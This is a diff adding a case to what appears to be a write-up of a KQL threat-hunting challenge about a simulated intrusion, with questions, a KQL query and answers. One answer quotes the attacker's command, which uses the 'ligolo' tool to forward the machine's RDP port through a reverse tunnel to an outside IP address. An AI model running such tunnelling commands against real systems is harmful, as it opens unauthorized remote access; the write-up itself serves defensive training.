@@ -86,3 +86,21 @@ FileCreationEvents
 ```
 
 *Answer for question 2*: `giftwrap.exe`
+
+#### Case #4
+*Question*: 
+1) The attacker created an reverse tunnel connection with the compromised machine. What IP was the connection forwarded to?
+2) What is the timestamp when the attackers enumerated network shares on the machine?
+3) What was the hostname of the system the attacker moved laterally to?
+
+*Query*:
+```kql
+ProcessEvents
+| where hostname == "Y1US-DESKTOP" and timestamp > datetime("2023-12-02T10:12:42Z")
+```
+
+*Answer for question 1*:
+This took a little manual analysis, eventually identifying the command:
+```batch
+cmd.exe "ligolo" --bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof
+```
